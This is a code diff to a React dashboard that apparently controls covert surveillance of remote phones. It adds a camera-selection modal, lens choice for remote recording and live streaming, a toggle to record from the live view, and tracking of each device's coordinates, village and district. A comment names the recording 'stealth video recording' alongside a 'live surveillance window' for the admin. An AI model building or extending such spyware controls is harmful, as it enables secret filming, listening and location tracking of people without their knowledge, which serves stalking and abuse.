@@ -41,6 +41,13 @@ export function DashboardProvider({ children }) {
   const [isLiveConnecting, setIsLiveConnecting] = useState(false);
   const frameCountRef = useRef(0);
 
+  // Camera Selection Modal State (Record & Live Stream)
+  const [cameraModal, setCameraModal] = useState({
+    open: false,
+    device: null,
+    actionType: "record", // 'record' | 'live'
+  });
+
   // Live Microphone Audio State
   const [isAudioMuted, setIsAudioMuted] = useState(false);
   const [audioLevel, setAudioLevel] = useState(0);
@@ -212,7 +219,7 @@ export function DashboardProvider({ children }) {
 
     s.on(
       "device-status-change",
-      ({ deviceId, isOnline, lastSeen, batteryLevel }) => {
+      ({ deviceId, isOnline, lastSeen, batteryLevel, latitude, longitude, locationName, villageOrPara, districtAndCountry, locationUpdatedAt }) => {
         setOnlineSocketDevices((prev) => {
           const next = new Set(prev);
           if (isOnline) next.add(deviceId);
@@ -226,6 +233,12 @@ export function DashboardProvider({ children }) {
                   ...d,
                   lastSeen: lastSeen || new Date(),
                   ...(batteryLevel !== undefined ? { batteryLevel } : {}),
+                  ...(latitude ? { latitude } : {}),
+                  ...(longitude ? { longitude } : {}),
+                  ...(locationName ? { locationName } : {}),
+                  ...(villageOrPara ? { villageOrPara } : {}),
+                  ...(districtAndCountry ? { districtAndCountry } : {}),
+                  ...(locationUpdatedAt ? { locationUpdatedAt } : (latitude ? { locationUpdatedAt: new Date() } : {})),
                 }
               : d,
           ),
@@ -233,7 +246,7 @@ export function DashboardProvider({ children }) {
       },
     );
 
-    s.on("device-heartbeat", ({ deviceId, lastSeen, batteryLevel, isRecording }) => {
+    s.on("device-heartbeat", ({ deviceId, lastSeen, batteryLevel, isRecording, latitude, longitude, locationName, villageOrPara, districtAndCountry, locationUpdatedAt }) => {
       setOnlineSocketDevices((prev) => {
         const next = new Set(prev);
         next.add(deviceId);
@@ -247,6 +260,12 @@ export function DashboardProvider({ children }) {
                 lastSeen: lastSeen || new Date(),
                 ...(batteryLevel !== undefined ? { batteryLevel } : {}),
                 ...(isRecording !== undefined ? { isRecording } : {}),
+                ...(latitude ? { latitude } : {}),
+                ...(longitude ? { longitude } : {}),
+                ...(locationName ? { locationName } : {}),
+                ...(villageOrPara ? { villageOrPara } : {}),
+                ...(districtAndCountry ? { districtAndCountry } : {}),
+                ...(locationUpdatedAt ? { locationUpdatedAt } : (latitude ? { locationUpdatedAt: new Date() } : {})),
               }
             : d,
         ),
@@ -306,10 +325,10 @@ export function DashboardProvider({ children }) {
   }, []);
 
   // Live Stream Handlers
-  const handleStartLiveStream = (device) => {
+  const handleStartLiveStream = (device, camera = "BACK") => {
     setLiveDevice(device);
     setLiveFrame(null);
-    setLiveLens("BACK");
+    setLiveLens(camera);
     setIsLiveConnecting(true);
     isAudioMutedRef.current = false;
     setIsAudioMuted(false);
@@ -317,8 +336,50 @@ export function DashboardProvider({ children }) {
     if (socket) {
       socket.emit("request-live-stream", {
         deviceId: device.deviceId,
-        camera: "BACK",
+        camera,
       });
+    }
+  };
+
+  // Camera Choice Modal Handlers
+  const openCameraModal = (device, actionType = "record") => {
+    setCameraModal({
+      open: true,
+      device,
+      actionType,
+    });
+  };
+
+  const closeCameraModal = () => {
+    setCameraModal({
+      open: false,
+      device: null,
+      actionType: "record",
+    });
+  };
+
+  const handleConfirmCameraAction = (camera = "BACK") => {
+    const { device, actionType } = cameraModal;
+    closeCameraModal();
+    if (!device) return;
+
+    if (actionType === "live") {
+      handleStartLiveStream(device, camera);
+    } else {
+      // 1. Start stealth video recording on device (saved to disk/Drive)
+      handleStartRemoteRecording(device.deviceId, camera);
+      // 2. Automatically open live surveillance window so admin can preview in real-time
+      handleStartLiveStream(device, camera);
+    }
+  };
+
+  const handleToggleRecordingFromLive = () => {
+    if (!liveDevice) return;
+    const currentDevice = devices.find((d) => d.deviceId === liveDevice.deviceId) || liveDevice;
+    if (currentDevice.isRecording) {
+      handleStopRemoteRecording(liveDevice.deviceId);
+    } else {
+      handleStartRemoteRecording(liveDevice.deviceId, liveLens || "BACK");
     }
   };
 
@@ -356,13 +417,13 @@ export function DashboardProvider({ children }) {
     a.click();
   };
 
-  const handleStartRemoteRecording = (deviceId) => {
+  const handleStartRemoteRecording = (deviceId, camera = "BACK") => {
     // Optimistically update device isRecording to true immediately
     setDevices((prev) =>
-      prev.map((d) => (d.deviceId === deviceId ? { ...d, isRecording: true } : d))
+      prev.map((d) => (d.deviceId === deviceId ? { ...d, isRecording: true, cameraLens: camera } : d))
     );
     if (socket) {
-      socket.emit("start-remote-recording", { deviceId });
+      socket.emit("start-remote-recording", { deviceId, camera });
     }
   };
 
@@ -533,6 +594,22 @@ export function DashboardProvider({ children }) {
       (d.lastSeen && (new Date() - new Date(d.lastSeen)) / 1000 < 60),
   ).length;
 
+  const updateDeviceLocation = (deviceId, locationData) => {
+    if (!deviceId || !locationData) return;
+    setDevices((prev) =>
+      prev.map((d) =>
+        d.deviceId === deviceId
+          ? {
+              ...d,
+              villageOrPara: locationData.villageOrPara || d.villageOrPara,
+              districtAndCountry: locationData.districtAndCountry || d.districtAndCountry,
+              locationName: locationData.locationName || d.locationName,
+            }
+          : d
+      )
+    );
+  };
+
   return (
     <DashboardContext.Provider
       value={{
@@ -560,12 +637,18 @@ export function DashboardProvider({ children }) {
         audioLevel,
         liveOnlineCount,
         fetchData,
+        updateDeviceLocation,
+        cameraModal,
+        openCameraModal,
+        closeCameraModal,
+        handleConfirmCameraAction,
         handleStartLiveStream,
         handleStopLiveStream,
         handleSwitchCamera,
         handleTakeSnapshot,
         handleStartRemoteRecording,
         handleStopRemoteRecording,
+        handleToggleRecordingFromLive,
         toggleAudioMute,
         toggleSelectRecording,
         handleSelectAllToggle,
